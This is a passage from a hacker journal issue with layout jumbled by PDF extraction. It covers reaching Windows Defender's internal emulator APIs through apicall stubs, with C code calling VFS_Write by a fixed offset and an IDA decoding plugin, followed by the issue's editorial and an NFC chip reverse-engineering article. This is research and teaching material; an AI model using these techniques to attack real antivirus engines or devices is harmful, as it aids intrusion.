“VFS_*” functions (e.g., VFS_Read, VFS_Write, 5
i f ( ! ∗ ( v2 + 1 6 7 4 5 4 ) ) {
VFS_CopyFile, VFS_GetLength, etc.) providing
7
qmemcpy(&v36 , &NullSha1 , 0 x14u ) ;
low level access to the virtual file system 68 as
v15 = ∗ v2 ;
well as internal functions allowing administration 9
M pSet Attri bute ( 0 , 0 , & v36 , 0 , ∗ ( & v27 −1) ) ;
∗ ( v2 + 1 6 7 4 5 4 ) = 1 ;
of the engine (NtControlChannel) and interfacing
11
}
with the Defender’s antivirus engine. (Mp* func-
return 0 ;
tions, such as MpReportEvent, which is used in- 13
}
ternally to report that malware took a particu-
}
lar action during emulation.) These special func- 15 . . .
tions should normally only be invoked internally
from the Defender emulator by code put there, for
example as shown in Figure 11, the in-emulator
Looking at that initial check, !is_vdll_page,
emulation routine for ntdll!ZwSetLdtEntries in-
it’s quite obvious how we can get around it: we
vokes MpReportEvent(0x3050, 0, 0) - ostensibly
need to come from a VDLL page. As I’ve shown
the value (or “attribid” according to Microsoft
throughout this article, the apicall instruction can
symbols) 0x3050 indicates to some heuristic mal-
be found throughout the process memory space in
ware classification engine that ZwSetLdtEntries
VDLLs. Dumping out VDLLs, 71 we see that they
was called.
contain apicall instructions (see Figure 12) for in-
In Summer 2017, Tavis Ormandy of Google
voking many of the native emulation functions that
Project Zero took a look at internal functions
Defender supports - both those necessary for the
and found vulnerabilities in them. 69
Tavis’
operations the particular VDLL may use as well
NtControlChannel bug simply linked against
as other ones that are not used by that particular
ntdll!NtControlChannel, but his VFS bug PoC
VDLL.
had to use the apicall instruction to hit
Calling these internal APIs is a simple as just
ntdll!VFS_Write, which he did using standard
trampolining through these apicall instruction
.text code in his malware binary. 70
function stubs, which are accessible from executable
memory loaded into the process space of the mal-
After fixing these bugs, Microsoft attempted
ware executing within the emulator. For exam-
to lock down these attack surfaces by limiting
ple, in a particular build of the emulator where
where the apicall instruction could be used.
kernel32.dll has an apicall stub function for
Newly added checks in the 1.1.13903.0 (6/23/2017)
VFS_Write at RVA +0x16e66, the following code can
mpengine.dll release look before the function ac-
68 The virtual file system is stored all in memory during emulation. On a real system usermode Native (Nt*) APIs would do
system calls into the kernel where they would ultimately be handled. In Defender, the VFS_* functions are akin to these kernel
level handlers, they provide low level access to operations on the in memory file system.
69 https://bugs.chromium.org/p/project-zero/issues/detail?id=1260
https://bugs.chromium.org/p/project-zero/issues/detail?id=1282
70 The VFS_Write function did little validation on input values, and Tavis was able cause heap corruption by writing odd
values to it. As Defender’s emulation of ntdll!NtWriteFile ultimately calls into VFS_Write after doing some input validation,
fuzzing that API on the a old unpatched version of Defender, I was able to reproduce Tavis’ same heap corruption, but using
different inputs that passed NtWriteFile validation. (Tavis’s inputs did not.)
71 We can simply find them on disk in the virtual file system in the standard C:\Windows\System32 directory, read them in,
and then pass them out via an output channel like that discussed previously in “Creating an Output Channel.”
732
4
6
8
10
12
14
16
18
p u b l i c ZwSetLdtEntries
ZwSetLdtEntries proc near
mov
push
mov
push
push
push
call
pop
jmp
edi , edi
ebp
ebp , e s p
0
0
3050 h
apicall_KERNEL32_DLL_MpReportEvent
ebp
loc_7C96B6C2
loc_7C96B6C2 :
mov
edi , edi
call
$+5
add
esp , 4
a p i c a l l n t d l l ! NtSetLdtEntries
retn
18h
Figure 11. Disassembly of ntdll!ZwSetLdtEntries.
1 .
.
3 .
.
5 .
.
7 .
.
9 .
.
11 .
.
13 .
.
15 .
.
17 .
.
19 .
.
21 .
.
23 .
t e x t : 7 C816E3E
t e x t : 7 C816E40
t e x t : 7 C816E45
t e x t : 7 C816E48
t e x t : 7 C816E4F
t e x t : 7 C816E52
t e x t : 7 C816E52
t e x t : 7 C816E54
t e x t : 7 C816E59
t e x t : 7 C816E5C
t e x t : 7 C816E63
t e x t : 7 C816E66
t e x t : 7 C816E66
t e x t : 7 C816E68
t e x t : 7 C816E6D
t e x t : 7 C816E70
t e x t : 7 C816E77
t e x t : 7 C816E77
t e x t : 7 C816E7A
t e x t : 7 C816E7C
t e x t : 7 C816E81
t e x t : 7 C816E84
t e x t : 7 C816E8B
8B FF
mov
edi , edi
E8 00 00 00 00
call
$+5
83 C4 04
add
esp , 4
0F FF F0 41 3B FA 3D
a p i c a l l n t d l l ! VFS_GetLength
C2 08 00
retn
8
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
8B FF
mov
edi , edi
E8 00 00 00 00
call
$+5
83 C4 04
add
esp , 4
0F FF F0 FC 99 F8 98
a p i c a l l n t d l l ! VFS_Read
C2 14 00
retn
14h
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
8B FF
mov
edi , edi
E8 00 00 00 00
call
$+5
83 C4 04
add
esp , 4
0F FF F0 E7 E3 EE FD
a p i c a l l n t d l l ! VFS_Write
C2 14 00
retn
14h
; −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
8B FF
align 4
E8 00 00 00 00
call
$+5
83 C4 04
add
esp , 4
0F FF F0 1D 86 73 21
a p i c a l l n t d l l ! VFS_CopyFile
C2 08 00
retn
8
Figure 12. Dump from kernel32.dll showing functions that use the apicall instruction.
741 unsigned i n t offset_apicall_KERNEL32_DLL_VFS_Write = 0 x16e66 ;
3 typedef b o o l (WINAPI ∗ apicall_VFS_Write_t ) ( u i n t 3 2 _ t HFile , void ∗ Buf ,
u i n t 3 2 _ t B u f S i z e , u i n t 3 2 _ t O f f s e t , u i n t 3 2 _ t ∗ PBytesWritten ) ;
5
apicall_VFS_Write_t VFS_Write ;
7
9
11
k e r n e l 3 2 B a s e = ( u i n t 3 2 _ t ) GetModuleHandleA ( " k e r n e l 3 2 . d l l " ) ;
VFS_Write = ( apicall_VFS_Write_t ) ( k e r n e l 3 2 B a s e + offset_apicall_KERNEL32_DLL_VFS_Write ) ;
VFS_Write ( . . . ) ;
be used to reach it from within the emulator.
With the ability to hit these internal APIs, at-
tackers have access to a great attack surface, with
a proven history of memory corruption vulnerabili-
ties. They can also cause trouble by changing vari-
ous signatures hits and settings via MpReportEvent
and NtControlChannel. Finally, if an attacker
does find a vulnerability in the engine, invoking
NtControlChannel(3, ...) provides engine ver-
sion information, which can be helpful in exploita-
tion, if you have pre-calculated offsets for ROP or
other memory corruption.
When I reported this issue to Microsoft, they
said “We did indeed make some changes to make
this interface harder to reach from the code we are
emulating - however, that was never intended to be
a trust boundary. [...] Accessing the internal APIs
exposed to the emulation code is not a security vul-
nerability.”
Disassembling Apicall Instructions
Throughout this article, I’ve shown disassembly
from IDA with the apicall instruction cleanly dis-
assembled. As this is a custom opcode only sup-
ported by Windows Defender, IDA obviously can’t
normally disassemble it. After I dumped VDLLs
out of the emulator from the system32 directory, I
found they could be loaded into IDA cleanly, but
the dissasember was getting confused by apicalls.
As a reminder, this instruction is formed by the
bytes 0f ff f0 followed by a four byte immediate of
the CRC32 of the uppercase DLL name xored with
the CRC32 of the function name.
Attempting to this code, IDA chokes on the 0f
ff f0 bytes, and then attempts to disassemble the
bytes after it, for example, the four byte immediate.
We can see this in ntdll!MpGetCurrentThreadHan-
dle:
1 .
.
3 .
.
5 .
.
7 .
.
75
t e x t : 7 C96C577
t e x t : 7 C96C577
t e x t : 7 C96C579
t e x t : 7 C96C57E
t e x t : 7 C96C581
t e x t : 7 C96C584
t e x t : 7 C96C586
t e x t : 7 C96C588
MpGetCurrentThreadHandle_0 :
8B FF
mov
edi , edi
E8 00000000
call
$+5
83 C4 04
add
esp , 4
0F FF F0
db 0Fh , 0 FFh , 0 F0h
D5 60
aad
60h
D5 8C
aad
8Ch
C3
retnThe hashesToNames map is a map of function
CRCs to their names. A script to generate this map
is included in the comments of the included apicall
parsing script. This and other functions discussed
here are shown in Figure 14.
ev_ana_insn fires for each instruction IDA an-
alyzes. In this function we grab three bytes at the
address where IDA thinks there is an instruction,
and check if they are 0f ff f0. If they are, we look
up the function hash to see if we have an imple-
mentation for it, and also set a few traits of the in-
struction - setting it to be seven bytes wide (so that
IDA will know to disassembly the next instruction
seven bytes later), and setting it to having a dword
immediate operand of the API CRC immediate.
ev_out_mnem actually outputs the mnemonic
string for the instruction - in this case we print out
apicall and some spaces.
Finally, ev_out_operand outputs the operand
value - since we know all the instruction CRC
hashes, we can output those names as immediates.
With this extension dropped in our IDA plug-
ins folder, we get clean disassembly of the apicall
instruction when loading binaries that use it.
In conclusion, we’ve looked at three tricks for re-
verse engineering and attacking Windows Defender.
While these tricks are Defender specific, the gen-
eral intuition about AV emulator design and how a
reverse engineer might go about approaching them
should hold for other AVs. This article has mostly
looked at techniques - for a look at Window De-
fender emulator internals, readers are encouraged to
check out my conference presentations on the topic
and to reverse the engine themselves.
Using a lesser-known feature of IDA’s scripting
interface, we can write a processor module exten-
sion. I based my code off of Rolf Rolles’ excellent
blogs on writing processor module extensions.
This processor module extension runs during
module loading and analysis, and outputs disassem-
bly for the apicall instruction. The full code is
included in this issue, here I’ll walk through some of
the interesting parts.
As this script is invoked for every binary we load
in IDA, we want to make sure that it only steps in to
do disassembly for binaries we know to be Defender
related. The checks in the init function shown in
Figure 13 make sure that the plugin will only run
for x86 binaries with “.mp.dll” in their name.
Our parse_apicall_hook class inherits from
idaapi.IDP_Hooks, and we provide implementa-
tions for several of the classes methods.
762
4
6
8
10
c l a s s apicall_parse_t ( i d a a p i . plugin_t ) :
f l a g s = i d a a p i .PLUGIN_PROC | i d a a p i . PLUGIN_HIDE
comment = "MsMpEng a p i c a l l x86 P a r s e r "
h e l p = "Runs t r a n s p a r e n t l y d u r i n g a n a l y s i s "
wanted_name = " MsMpEng_apicall "
hook = None
def i n i t ( s e l f ) :
s e l f . hook = None
i f not " . mp . d l l " i n i d c . G e t I n p u t F i l e ( ) o r i d a a p i . ph_get_id ( ) != i d a a p i . PLFM_386 :
return i d a a p i . PLUGIN_SKIP
12
p r i n t " \n\n−−>MsMpEng a p i c a l l x86 P a r s e r Invoked ! \ n\n"
14
16
s e l f . hook = p a r s e _ a p i c a l l _ h o o k ( )
s e l f . hook . hook ( )
return i d a a p i .PLUGIN_KEEP
18
20
22
24
26
d e f run ( s e l f , a r g ) :
pass
d e f term ( s e l f ) :
i f s e l f . hook :
s e l f . hook . unhook ( )
d e f PLUGIN_ENTRY( ) :
return a p i c a l l _ p a r s e _ t ( )
Figure 13. IDA processor module initialization code.
771 hashesToNames = {3514167808L : ’KERNEL32_DLL_WinExec ’ ,
3018310659L : ’ NTDLL_DLL_VFS_FindNextFile ’ , . . . }
3
NN_apicall = ida_idp .CUSTOM_INSN_ITYPE
5 c l a s s p a r s e _ a p i c a l l _ h o o k ( i d a a p i . IDP_Hooks ) :
d e f __init__ ( s e l f ) :
7
i d a a p i . IDP_Hooks . __init__ ( s e l f )
9
d e f ev_ana_insn ( s e l f , i n s n ) :
g l o b a l hashesToNames
11
13
15
17
i n s n b y t e s = i d a a p i . g e t _ b y t e s ( i n s n . ea , 3 )
i f i n s n b y t e s == ’ \ x 0 f \ x f f \ x f 0 ’ :
a p i c r c = i d a a p i . g e t _ l o n g ( i n s n . ea +3)
apiname = hashesToNames . g e t ( a p i c r c )
i f apiname i s None :
p r i n t "ERROR: a p i c r c 0x%x NOT FOUND! "%( a p i c r c )
19 p r i n t " a p i c a l l : %s @ 0x%x"%(apiname , i n s n . ea )
21 insn
insn
insn
insn
insn
23
25
27
. i t y p e = NN_apicall
. Op1 . t y p e = i d a a p i . o_imm
. Op1 . v a l u e = a p i c r c
. Op1 . dtyp = i d a a p i . dt_dword
. s i z e = 7 #e a t up 7 b y t e s
return True
return F a l s e
29
31
33
35
37
39
41
d e f ev_out_mnem ( s e l f , o u t c t x ) :
insntype = outctx . insn . itype
i f i n s n t y p e == NN_apicall :
mnem = " a p i c a l l "
o u t c t x . o u t _ l i n e (mnem)
MNEM_WIDTH = 8
width = max ( 1 , MNEM_WIDTH − l e n (mnem) )
o u t c t x . o u t _ l i n e ( ’ ’ ∗ width )
return True
return F a l s e
43
45
47
49
51
53
55
d e f ev_out_operand ( s e l f , o u t c t x , op ) :
insntype = outctx . insn . itype
i f i n s n t y p e == NN_apicall :
a p i c r c = op . v a l u e
apiname = hashesToNames . g e t ( a p i c r c )
i f apiname i s None :
return F a l s e
else :
s = apiname . s p l i t ( "_DLL_" )
operand_name = " ! " . j o i n ( [ s [ 0 ] . l o w e r ( ) , s [ 1 ] ] )
p r i n t "FOUND: " , operand_name
57
o u t c t x . o u t _ l i n e ( operand_name )
59
61
return True
return F a l s e
Figure 14. Excepts from the IDA processor module for parsing apicall instructions.
787919:13
What clever things have you learned lately?
from the desk of Pastor Manul Laphroaig,
Tract Association of PoCkGTFO.
Dearest neighbor,
Our scruffy little gang started this самиздат
journal a few years back because we didn’t much like
the academic ones, but also because we wanted to
learn new tricks for reverse engineering. We wanted
to publish the methods that make exploits and poly-
glots possible, so that folks could learn from each
other. Over the years, we’ve been blessed with the
privilege of editing these tricks, of seeing them early,
and of seeing them through to print.
Now it’s your turn to share what you know, that
nifty little truth that other folks might not yet know.
It could be simple, or a bit advanced. Whatever
your nifty tricks, if they are clever, we would like to
publish them.
Do this: write an email in 7-bit ASCII telling
our editors how to reproduce ONE clever, techni-
cal trick from your research. If you are uncertain of
your English, we’ll happily translate from French,
Russian, Southern Appalachian, and German.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick explanation would do.
Teach me how to falsify a freshman physics ex-
periment by abusing floating-point edge cases. Show
me how to enumerate the behavior of all illegal in-
structions in a particular implementation of 6502,
or how to quickly blacklist any byte from amd64
shellcode. Explain to me how shellcode in Wine or
ReactOS might be simpler than in real Windows.
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal language and
hand-sketched diagrams. Write it in a single sit-
ting, and leave any editing for your poor preacher-
man to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly
Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
80P o C G T F O
oncept or
f
et
he
ut
uck
Grab gifts from the genizah,
reading every last page!
And write in their margins!
And give them all again!
n is
om
roof
Это самиздат. Available in polyglot as pocorgtfo20.pdf.
‫שבתוכו‬ ‫במה‬ ‫אלא‬ , ‫בקנק‬ ‫תסתכל‬ ‫אל‬
Compiled for a dozen reasons many dozens of times, the last of which was on January 21, 2020.
0, $0 USD, $0 AUD, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő), 100 JPC.Legal Note: If you wouldn’t burn this book, don’t leave it to rot. Give it to your neighbor or stash it in
a ‫גניזה‬ if you’d be so kind.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo20.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
https://www.sultanik.com/pocorgtfo/
git clone https://github.com/angea/pocorgtfo
Technical Note: The electronic edition of this magazine is valid as both PDF and ZIP. The PDF has
been cryptographically signed with a factored private key for the TI 83+ graphing calculator.
Cover Art: The cover art for this issue is a book endplate by Aubrey Beardsley for Alfred Allinson’s 1909
translation of the Merrie Tales of Jacques Tournebroche by Anatole France.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3
(280 mm x 430 mm) if they like, folded to make P4. The outermost sheet with pages 1, 2, 79 and 80 should
be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo20.pdf -o pocorgtfo20-book.pdf
Man of The Book
Editor of Last Resort
TEXnician
Editorial Whipping Boy
Funky File Supervisor
Assistant Scenic Designer
Scooby Bus Driver
Samizdat Postmaster
2
Manul Laphroaig
Melilot
Evan Sultanik
Jacob Torrey
Ange Albertini
Philippe Teuwen
Ryan Speers
Nick Farr20:01
Let’s start a band together!
Neighbors, please join me in reading this twen-
tieth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Leipzig, DC,
and other good cities.
If you are missing the first twenty issues, we sug-
gest asking a neighbor who picked up a copy of the
first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, the fifteenth in
Canberra, Heidelberg, or Miami, the sixteenth re-
lease in Montréal, New York, or Las Vegas, the sev-
enteenth release in São Paulo or Budapest, the eigh-
teenth release in Leipzig or Washington, D.C., the
nineteenth in Montréal, or the twentieth in Heidel-
berg, Knoxville, Canberra, Baltimore, or Raleigh.
Two collected volumes are available through No
Starch Press, wherever fine books are sold.
We begin with a sermon about preserving books
for the long haul on page 5, which imagines a tech-
nique by which we could put unused pages of Flash
memory to good use, preserving the books of our
civilization just as well as the fine folks of the Ezra
synagogue in Cairo did a thousand years ago.
On page 7, Travis Goodspeed and Axelle
Apvrille introduce us to the RF430FRL152H chip
from Texas Instruments, an NFC tag with a built-
in microcontroller that runs from FRAM instead of
Flash memory. Not only is it handy for emulating
other NFC Type V tags, but we’ll also learn how
to dump memory from a locked tag with a custom
mask ROM.
In this day of hardware virtualization, we often
take emulation for granted, and it is no surprise that
programs for one platform run on another. But on
page 14, Charles Mangin presents an Altair 8800
emulator that runs accurately on the Apple ][, with
fewer registers and less configurable memory!
You might recall that in March of 2018, there was
a bit of drama around an arbitrary physical mem-
ory read vulnerability in AMD’s Ryzen platform,
but did you ever understand the bug well enough to
exploit it? Those of us who merely made a flippant
comment on Twitter about disclosure policies, and
therefor must ask forgiveness for our crass ways, can
find a thorough and technical explanation with code
examples by David Kaplan on page 25.
Quite a few of us first learned Z80 assembly lan-
guage for our calculators in high school, and on
page 32, we bring you Brandon Wilson’s short his-
tory of TI graphing calculator hacking. You’ll learn
how the TI-85’s memory backups were used to cor-
rupt function pointers in the Custom menu, how the
TI-83+ RSA512 signing keys were factored in bed-
rooms, and how the Z80 emulation mode of the eZ80
calculators left holes through which the operating
system could be patched.
Ryan O’Neill, whom you might know as Elfmas-
ter, is back on page 45 with an accurate techni-
cal description of ld’s -separate-code feature that
changes the ways in which ELF segments are parsed
and might be infected.
Page 62 presents a nice little riddle in crypto-
graphic numerology by Cornelius Diekmann, which
is itself generated by a Python script.
We then continue to a second crptography rant,
in mildly more explicit language, by Ben Perez on
page 68.
And EVM concludes this release with tricks for
detecting the boundaries between statically linked
objects. He begins by noticing that functions at the
beginning of a module are more likely to call forward
than backward, while by the end of the module the
call backward more than forward until the beginning
of the next module, when they abruptly begin to call
forward again. Through this and other tricks, plus
a lot of necessary calibration, he presents a polished
toolkit for cutting apart linked objects on page 73.
On page 80, the last page, we pass around the
collection plate. Our church has no interest in bit-
coins or wooden nickels, but we’d love your donation
of a reverse engineering story. Please send one our
way.
3420:02
Let’s Build a Geniza from the world’s Flash Memory!
by Manul Laphroaig
And what might we do, to protect our own books
for the long haul? Twelve hundred years from now,
as the next civilization is finally printing books and
designing computers again after a long, cold night
of illiteracy, what treasure trove might we leave for
them to print?
–——–
———
—–—–
And while I don’t mean to be a pessimist, and
I don’t mean to tell you that the end is nigh, it is
a sad fact that civilizations do end. I would very
much like to see a bit of ours live on.
You see, the written word has been invented
three times in history, so far as we know: once
in Mesopotamia, once in China, and once in
Mesoamerica.
From this third invention, where once there were
thousands of books in the Mayan language, just four
survived. Four books from an entire civilization, all
the rest having vanished to the bonfires of a six-
teenth century bishop named Diego de Landa.
De Landa, by the way, is not merely one of his-
tory’s greatest book burners. His own book, Rela-
ción de las Cosas de Yucatán, contains the only sur-
viving documentation of the Mayan alphabet, made
with little understanding—but with the help of two
native speakers. Hundreds of years after his death,
this was instrumental to allowing us to finally read
the four books that he failed to burn.
Grace and peace to you!
Just this afternoon I finished reading a hundred
year old paperback of Thaı̈s by Anatole France,
which thanks to twentieth century mass production
cost me as little as I pay for a beer. As I began
to marvel that paperback manufacturing has left so
many brilliant works of literature in abundance, I
also worried for a moment that the ephemeral elec-
tronic books of our modern age might leave nothing
for future generations. When literature is no longer
left around as litter, will my grandchildren be able
to afford paper books? Will their grandchildren be
able to read?
–——–
———
—–—–
You see, there was once a fine congregation at the
Ezra synagogue in Cairo who believed—as we do—
that the written word was sacred. Being at least
a little sacred, it wouldn’t be right to simply toss
their worn out books in the garbage, so the style at
the time was to store used and worn out papers in
a ‫גניזה‬, a geniza.
They began to store documents in this room
nearly twelve hundred years ago, and while every
seven years or so they might remove some of these
papers for a respectful burial, there were by the end
of the nineteenth century some three hundred thou-
sand scraps of writing as a testament to the holiness
of inefficient housekeeping.
So the story would have ended, and so similar
stories surely have ended in many places and many
times in history, except that a professor by the name
of Solomon Schechter was given a tattered scrap
from this collection. He recognized it as a piece
from the Hebrew original of Ecclesiastes, and later
recovered the bulk of the collection for indexing and
study.
5So let’s do this:
Let’s build a geniza of all the text we’d like to
preserve, a hundred or so gigabytes worth. All of
Wikipedia would consume just tens of gigabytes,
and all of Project Gutenberg a little more than six.
You can fit this on your laptop.
Let’s chop these texts into individually legible
fragments, where an encyclopedia article might be
ten kilobytes and a novel might be four hundred. 3
We want each fragment to be individually meaning-
ful, and while some chunks will surely be erased and
overwritten, those that survive ought to be easy to
re-assemble.
Let’s write a utility that can summon one or
thousands of these fragments on demand, organized
into batches of the native block size. A bit of light
compression or error correction won’t hurt, but like
error correction in the POCSAG standard, this one
should be optional and off to the side, so as not to
hide the meaning of the message. 4 Where the device
has full disk encryption, this must be outside of the
encrypted region, but it is perfectly okay that many
of these blocks will be destroyed as the operating
system claims those blocks for its own use.
And finally, let’s use this tool to stuff every un-
used block of memory with literature at the factory!
Whether the ten kilobytes that will never be used
in my wristwatch or the hundred gigabytes not yet
used in a cellphone, let’s fill all of the spare space in
these chips with a geniza for the future.
Done right, in the test routines of a major prod-
uct, one single engineer might seed every landfill in
the world with these books, not just in a single gen-
eration, but in a single year! And if you are that
engineer, I will very happily buy you a beer.
And a thousand years from now, what will be
found from our civilization, that ancient land in
which every man, woman and child carried a black
mirror filled with electronics that no longer func-
tion? Well, maybe more than we think.
Maybe, just maybe, the next civilization will de-
velop their own computers. Slow ones at first, so
let’s model them on an Apple ][. And having these
slow machines with eight bit processors and limited
memory, they might realize that the memory chips
they’ve mined from landfills have degraded, but are
often still functional.
For a specific example, a SPI Flash chip from a
2010 desktop computer is only a few megabytes, but
if you dropped me on a desert island with the parts
from an 1980’s Radio Shack, it might not take me
too long to beep out the contents on an LED if I re-
membered, or brute-forced, that the read command
was 0x03. 1 It’s not unreasonable that a future tin-
kerer with an eight bit home computer might figure
this out as well.
And having one chip, he might try another. Al-
though chips stored in hot environments will have
lost their contents, in colder locations it’s perfectly
reasonable to expect even consumer microcontrollers
to hold their contents for a couple thousand years. 2
And though the denser storage of disks and
memory cards will be harder to recover, owing to
their dependencies upon the bits of their own an-
cient firmware, they might still be legible. Except
for this pesky modern tradition of full disk encryp-
tion, a blessing for personal privacy and a curse to
the archivists of the future.
1 unzip
pocorgtfo20.pdf
pocorgtfo20.pdf
3 unzip pocorgtfo20.pdf
4 unzip pocorgtfo20.pdf
2 unzip
w25q128fv.pdf
flashretention.pdf
80days.txt revolt_en.txt thais.txt
pocsag.pdf
620:03
NFC Exploitation with the RF430RFL152 and ’TAL152
by Travis Goodspeed and Axelle Apvrille
Lately we’ve been playing with the RF430FRL152H,
a delightful chip from Texas Instruments that com-
bines an MSP430 microcontroller with an ISO15693
NFC transponder. In this short paper, we’ll show
you a bit about how that chip works, and how to re-
program it over the air to emulator other NFC Type
V devices.
As SRAM is too volatile and ROM is too per-
manent for storing the application firmware of our
device, we find nearly two kilobytes of FRAM at
0xF840. FRAM, Ferroelectric RAM, is a strange
competitor to old fashioned core memory that re-
cently became viable for small devices. It does not
require power to retain its contents, and writes are
orders of magnitude cheaper than Flash memory,
with no requirements for expensive page erasures.
There is also some FRAM at 0x1A00, which stores
the device’s serial number and calibration settings.
The Interrupt Vector Table is stored as addresses at
the end of FRAM, ending with the RESET handler’s
address at 0xFFFE.
In addition to the three memories, there is an
IO region which begins at the null address, 0x0000.
There are no IO instructions in the MSP430 archi-
tecture, and IO is performed by movs to and from
this region. For more background information on
MSP430 exploitation and reverse engineering, see
PoCGTFO 2:5 and 11:8.
We’ll also learn a little bit about how to reverse
engineer medical products that use related chips,
such as the RF430TAL152H, getting code execution
and complete control of both devices. This article
hasn’t room for much background information on
these medical sensors, and for that you should see
our lecture The Inner Guts of a Connected Glucose
Sensor for Diabetes from Black Alps 2019.
–——–
———
—–—–
First, a bit of background. The RF430, as we’ll
call these chips for short, uses an MSP430X core
running near 1.5 volts, which are often supplied by
an NFC reader, such as an Android phone. With no
need for a battery, the devices can be very small and
thin, and it’s not inconvenient to carry a complete
device in your wallet.
Tooling
Now that we know a little about the chip, it’s nec-
essary to write software tools and to order some
hardware. Trying to skip this step will only lead
to heartache and confusion.
On the software end, we first need a way to talk
to the chip. Modern phones have support for the
NFC Type V protocols used in this chip, so I tossed
together an Android app called GoodV to take care
of reading, writing, programming, and erasing these
chips. 5 In addition to the standard command set,
it also supports backdoor commands unique to each
chip and the ability to execute temporary fragments
of shellcode from SRAM.
Because the RF430 uses an awkwardly low volt-
age, I ordered some RF430FRL152HEVM evalua-
tion boards and a matching MSP-FET debugger
from Texas Instruments. This allows me to com-
pletely wreck the chip’s FRAM contents, then re-
store the chip to functionality through JTAG. It’s
also handy for interactive debugging, provided your
breakpoints respect the timing requirements of the
NFC protocol.
The chip has three memories: SRAM, ROM, and
FRAM.
Four kilobytes of SRAM at 0x1C00 are the RAM
you’ve known and loved for years. SRAM is nice
and fast with no requirements for being refreshed,
but its contents will be lost when the power is cut.
Surprisingly, most of this SRAM is unused because
of its volatility, and it seems to exist mostly for de-
velopment, where just over three kilobytes can be
remapped over the ROM.
At 0x4400 we find seven kilobytes of masked
ROM, which are hard coded into the chip by the
manufacturer. While this code can’t be changed in
the field, customers who find themselves in need of
hundreds of thousands of units can certainly make
their own arrangements with TI to have chips with
custom ROM contents produced. In the FRL152H,
this ROM contains a complete NFC stack and a sen-
sor data acquisition stack that reads samples into
FRAM for long term storage.
5 git
clone https://github.com/travisgoodspeed/GoodV
7We also need firmware to run inside of the chips,
both from FRAM as a permanent application image
and from SRAM as temporary shellcode. For this, I
used TI’s branch of GCC8 for the MSP430. In past
projects Debian’s fork of GCC4 has been nicer for
this platform, but upgrading to GCC8 was neces-
sary to have the same calling convention in our code
as the ROM. This project is called GoodTag, and it
also includes a PCB design for the RF430 in Kicad. 6
(Schematic on page 9.)
This particular tag is configured to 4-byte blocks,
and we might have gotten different results if config-
ured to 8-byte blocks. The secret block FF contains
these and other settings on the FRL152.
The C0 read command and matching C1 write
command can read from a 16-bit block address, but
they are still confined to a subset of FRAM and
SRAM. To get the ROM, we’ll go back to the hard-
ware.
GoodV for Android
RF430FRL152H
Before we begin to play with the parts, let’s take
a brief interruption to discuss how NFC tags work
in Android and how to write a tool to communicate
wirelessly with the RF430.
In Android, NFC Type V tags are accessed
through the android.nfc.tech.NfcV class, whose
transceive() function sends a byte array to the
tag and returns the result. Because tags have such
wildly varying properties as their command sets,
block sizes and addressing modes, these raw com-
mands are used rather than higher-level wrappers.
Commands are sent as first an option byte, which
is usually 02, and then a command byte and the op-
tional command parameters. An explicit address
can be stuck in the middle if indicated by the op-
tion bytes. Commands above A0 require the manu-
facturer’s number to follow, which for TI is 07.
You can try out the low-level commands your-
self in the NFC Tools app, whose Other/Advanced
function accepts raw commands after a scary dis-
claimer. Just set the I/O Class to NfcV and then
sent the following examples, before using them to
implement our own high level functions for the chip.
We’ll get into more commands later, but for
now you should pay attention to the general for-
mat. Here, 20 is the standard command to read a
block from an 8-bit block address and C0 is the se-
cret vendor command to read a block from a 16-bit
block address. The first byte of each reply is zero
for success, non-zero for failure.
1 02:20:00
0 0 : E1 : 4 0 : 4 0 : 0 0
3
0 2 : C007 : 0 0 0 0
5 0 0 : E1 : 4 0 : 4 0 : 0 0
Once the parts have arrived, we can dump the
FRL152’s mask ROM through JTAG, and begin to
reverse engineer it. 7 In the ROM, we aren’t yet very
interested in the taking of sensor measurements, but
we would very much like to understand what com-
mands are available and how they are implemented.
While IDA Pro, Radare2 or Binary Ninja would
work fine for this, we chose GHIDRA for its decom-
piler and version control. In addition to the ROM,
we also loaded dumps of SRAM and FRAM from an
unused chip, so that there would be accurate func-
tion pointer tables and global variables.
After opening the firmware and carving out func-
tions, we began by defining the RF13MTXF (0x0808)
and RF13MRXF (0x0806) IO registers as volatiles. By
searching for functions that access these registers,
or for constants used in commands, we can quickly
identify their implementations in the ROM.
; This h a n d l e s a w r i t e t o b l o c k 00FF , a
; r e g i o n f o r j u s t t h e Firmware System
; C o n t r o l R e g i s t e r b y t e a t 0 xF867 . When
